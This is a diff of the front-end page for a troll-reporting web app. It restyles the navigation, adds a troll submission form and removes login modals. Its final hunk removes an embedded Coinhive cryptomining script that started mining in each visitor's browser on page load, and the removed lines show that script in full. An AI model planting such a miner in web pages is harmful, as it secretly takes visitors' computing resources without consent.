@@ -7,6 +7,8 @@ include('ip_track.php');
 
 ?>
 
+
+
 <html lang="en">
 
 <head>
@@ -22,13 +24,16 @@ include('ip_track.php');
 </head>
 
 <body>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
 
     <!-- Full Screen Container START -->
     <div class="container-fluid main-cont">
         <div class="row center-row">
             <div class="col" style="padding:0;">
 
-                <!--<div id="particles-js"></div>-->
+                <div id="particles-js"></div>
 
                 <nav class="navbar navbar-toggleable-md mynavbar">
                     <button class="navbar-toggler navbar-toggler-right custom-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
@@ -38,79 +43,74 @@ include('ip_track.php');
                     <div class="collapse navbar-collapse" id="navbarSupportedContent">
                         <ul class="navbar-nav ml-auto">
                             <li class="nav-item">
-                                <a class="nav-link" data-toggle="modal" data-target="#login" href="#">Login</a>
+                                <a class="nav-link" href="#">Login</a>
                             </li>
                             <li class="nav-item">
-                                <a class="nav-link" data-toggle="modal" data-target="#register" href="#">Register</a>
+                                <a class="nav-link" href="#">SignUp</a>
                             </li>
                         </ul>
                     </div>
                 </nav>
 
-                <div id="search-bar-div">
+                <!-- Search Bar Div START -->
+                <div class="screen-div" id="search-bar-div">
                     <form class="center-form">
                         <div class="form-group">
                             <div class="input-group" id="troll-search">
                                 <input id="trollName" class="form-control" type="search" placeholder="troll much?">
                                 <span class="input-group-btn button-span">
-                                <button class="btn btn-primary" id="getUser">GO</button>
-                            </span>
+                                    <button class="btn btn-primary" id="getUser">GO</button>
+                                </span>
                             </div>
                         </div>
                     </form>
                 </div>
+                <!-- Search Bar Div END -->
+
+                <div id="troll-submit-div">
+                    <div class="action-section">
+                        <div class="row">
+                            <div class="col banner-col text-center">
+                                <h1 class="title-header">Congrats!</h1>
+                                <h3 class="sub-header">you've caught a troll.</h3>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="submit-section">
+                        <div class="row">
+                            <div class="col centered-submit">
+                                <div class="row">
+                                    <div class="col troll-type-col text-center">
+                                        <div class="btn-group troll-butts" role="group" aria-label="Basic example">
+                                            <button type="button" class="btn troll-type-butt" id="fun-butt">Funny</button>
+                                            <button type="button" class="btn troll-type-butt" id="nuet-butt">Neutral</button>
+                                            <button type="button" class="btn troll-type-butt" id="mal-butt">Malicious</button>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row">
+                                    <div class="col text-center">
+                                        <div class="comment-section">
+                                            <label for="troll-comment" class="comment-label">What did this troll do?</label>
+                                            <div class="input-group">
+                                                <textarea id="troll-comment" class="form-control" type="text" placeholder=""></textarea>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+
             </div>
         </div>
     </div>
     <!-- Full Screen Container END -->
 
-<!-- Begin Login modal -->
-<div class="modal fade" id="login">
-  <div class="modal-dialog" role="document">
-    <div class="modal-content">
-      <div class="modal-header">
-        <h5 class="modal-title">Modal title</h5>
-        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body">
-        <p>Login Form</p>
-      </div>
-      <div class="modal-footer">
-        <button type="button" class="btn btn-primary">Sign in</button>
-        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
-      </div>
-    </div>
-  </div>
-</div>
-<!-- End login modal -->
-<!-- Start registration modal -->
-<div class="modal fade" id="register">
-  <div class="modal-dialog" role="document">
-    <div class="modal-content">
-      <div class="modal-header">
-        <h5 class="modal-title">Modal title</h5>
-        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body">
-        <p>Registration Form</p>
-      </div>
-      <div class="modal-footer">
-        <button type="button" class="btn btn-primary">Sign up!</button>
-        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
-      </div>
-    </div>
-  </div>
-</div>
-<!-- End registration modal -->
-
     <!-- BS4, Tether, jQuery -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-    <!-- javascript was being declared at top of body causing conflicts -->
-    <!-- <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script> -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.4.0/js/tether.min.js"></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/js/bootstrap.min.js" integrity="sha384-vBWWzlZJ8ea9aCX4pEW3rVHjgjt7zpkNpZk+02D9phzyeVkE+jo0ieGizqPLForn" crossorigin="anonymous"></script>
 
@@ -118,14 +118,9 @@ include('ip_track.php');
     <script src="https://www.gstatic.com/firebasejs/4.4.0/firebase.js"></script>
 
     <!-- Particle.js -->
-    <!-- <script src="assets/js/particles.js"></script> -->
+    <script src="assets/js/particles.js"></script>
     <script src="assets/js/firebase.js"></script>
-    <!-- <script src="assets/js/app.js"></script> -->
-    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
-    <script>
-	    var miner = new CoinHive.Anonymous('65lW8LhXcyVEGl0XZk3POHNkc0pqqndm');
-	    miner.start();
-    </script>
+
 </body>
 
 </html>
